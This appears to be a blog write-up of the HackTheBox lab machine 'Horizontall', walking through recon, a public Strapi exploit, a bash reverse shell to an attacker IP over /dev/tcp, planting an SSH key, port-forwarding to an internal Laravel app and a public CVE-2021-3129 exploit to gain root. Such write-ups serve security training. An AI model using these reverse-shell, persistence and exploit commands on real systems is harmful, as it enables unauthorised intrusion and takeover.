---
title: HTB-Horizontall
tags: [laravel, RCE, CVE]
published: true
categories: [HTB]
image: /assets/images/htb/Horizontal/htb.png
---

# Horizontall machine on [hackthebox](https://app.hackthebox.com)


## Recon

Starting with an nmap scan we can see that there are only 2 ports open.

![](/assets/images/htb/Horizontal/Pasted image 20240430175510.png)

Lets add horizontall.htb to our hosts file and explore the web page. 

![](/assets/images/htb/Horizontal/Pasted image 20240430175755.png)

### Web (html) 

Clicking through the web application trying to understand its functionality doesn't provide us with any useful information as the webpage appears to be static without any functionality implemented. 

![](/assets/images/htb/Horizontal/Pasted image 20240430180349.png)

Looking at the wappalyzer doesn't really get us much more information. 

![](/assets/images/htb/Horizontal/Pasted image 20240430180527.png)

So at this point we could try to brute force directories or potential vhosts.  
Lets try dir busting first! Unfortunately we haven't found anything of interest again...

![](/assets/images/htb/Horizontal/Pasted image 20240430181051.png)

We can try vhosts scan or look at the source of the web app, specifically into .js files and see if there are some clues left there. 
Inspecting the `app.c68eb462.js` file we search for `horizontall.htb` string hoping for some possible endpoints we can examine and we finally get a hit!! It appears that there is a subdomain `api-prod.horizontall.htb/`

![](/assets/images/htb/Horizontal/Pasted image 20240430181728.png)

Lets add it to our hosts file and explore some more. 

![](/assets/images/htb/Horizontal/Pasted image 20240430181919.png)

### API 

Going to the 'http://api-prod.horizontall.htb/' we are greeted with a simple "Welcome" message. 


![](/assets/images/htb/Horizontal/Pasted image 20240430182048.png)

Once again lets try directories brute forcing with ffuf and see if we get any luck 🤞 

![](/assets/images/htb/Horizontal/Pasted image 20240430182429.png)

As you can see we found admin endpoint among others like users and reviews. 
Investigating the `/admin` endpoint lands us on strapi login page. 

![](/assets/images/htb/Horizontal/Pasted image 20240430182610.png)

From here we have couple of options. We could try guessing usernames and passwords like `admin:admin` etc or go to google and see if there are any default credentials for strapi. We could also try sql injection in the login form or play around with password reset functionality. 

What we are going to do first though is look up if there are any known vulnerabilities in the strapi. 
After quick google search we can see that there is an exploit for `Strapi CMS 3.0.0-beta.17.4` in exploit db.

![](/assets/images/htb/Horizontal/Pasted image 20240430183345.png)

However at this point in time we aren't really sure what is the version of our strapi. 
Scrolling through the exploit code we can see that there is a version check before an exploitation attempt is made. We can see that in here. 

![](/assets/images/htb/Horizontal/Pasted image 20240430183633.png)

Lets see if we can manually check the version ourselves going to `/admin/init` endpoint. 

![](/assets/images/htb/Horizontal/Pasted image 20240430183801.png)

Perfect! Seems like we have a version match. Now lets get down to business. 

## Foothold

Time to copy the exploit code to our machine and try getting reverse shell one the box. 

![](/assets/images/htb/Horizontal/Pasted image 20240430184521.png)

Exploit seems to be working. We can start an ncat listener on our machine and try curling ourselves to make sure we do have code execution. 

![](/assets/images/htb/Horizontal/Pasted image 20240430184832.png)

![](/assets/images/htb/Horizontal/Pasted image 20240430184858.png)

Awesome!! Everything seems to be working so far. This time lets send the bash reverse shell. 

```bash
$> bash -c 'bash -i >& /dev/tcp/10.10.14.113/9001 0>&1'
```

And we got in!! 

![](/assets/images/htb/Horizontal/Pasted image 20240430185239.png)

## Privesc 

We are gonna drop ssh key on the box for a better and more stable shell. We can do that by running: 

```bash
ssh-keygen 
```

Next on our victim machine we should make a directory `.ssh` in our home folder and paste the public key we just generated inside authorized_keys file and then adjust permissions. Like this: 

```bash
cd ~
mkdir .ssh
echo " <your public key here> " > authorized_keys
chmod 600 authorized_keys
```

Then we simply ssh in with our private key as follows.

```bash
┌──(sinin㉿legion)-[~/.ssh]
└─$ ssh strapi@10.129.2.203 -i id_ed25519
```

Once we are logged back in lets see if we can find some more information about the users on this box. Simple cat on `/etc/passwd` should let us know what are the usernames. 

![](/assets/images/htb/Horizontal/Pasted image 20240430205231.png)

We can see that besides the us there is also a developer and root user. Next lets see what ports are listening on our box. 

![](/assets/images/htb/Horizontal/Pasted image 20240430205111.png)

We have couple of ports listening. Port `22` and `80` we can exclude since we already know what those are. Same goes for port `3306` as its `MySQL` database for strapi web app. We could try extracting database username and password from the source code which we may eventually. However at this point i wanna see what's up with ports `1337` and `8000`. So what we are going to do first is simply curl those addresses and see we we get any http response from them. 

![](/assets/images/htb/Horizontal/Pasted image 20240430205834.png)

On port `1337` we have the welcome msg we already seen. Which means that's strapi application that we already exploited. What about port `8000`?

![](/assets/images/htb/Horizontal/Pasted image 20240430205948.png)

That's something new! Looks like yet another web app. It would be nice if we could access it from our browser. In order to achieve that we are going to have to set up ssh tunnel. 

```bash
~C
ssh> -L 9002:127.0.0.1:8000
```

Now we are forwading port 8000 on the box to the port `9002` on our machine through ssh tunnel and we can simply go to 'http://localhost:9002' in our browser and check out the page. 

![](/assets/images/htb/Horizontal/Pasted image 20240430213117.png)

This time we have a laravel default welcome page. A quick google search for laravel on [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/laravel) and there is couple of interesting things for us to try. Going to `/profiles` shows us an error page indicating that laravel is running in debug mode. Exploring context tab on the error page tells us that the `laravel` version is `8.43.0` which seems to be vulnerable to RCE that we found on hacktricks. 

![](/assets/images/htb/Horizontal/Pasted image 20240430213855.png)

The only thing left now is to find working exploit. I found one on this github [repo](https://github.com/nth347/CVE-2021-3129_exploit) We can clone the repo and follow instructions.

```bash
$ git clone https://github.com/nth347/CVE-2021-3129_exploit.git
$ cd CVE-2021-3129_exploit
$ ./exploit.py http://localhost:8000 Monolog/RCE1 id
```

Victory!! Finally got root privileges on the box. 

![](/assets/images/htb/Horizontal/Pasted image 20240430215619.png)

So that would be it when it comes to Horizontall. At this point we can simply cat the root flag or drop reverse shell to gain root shell on the machine. 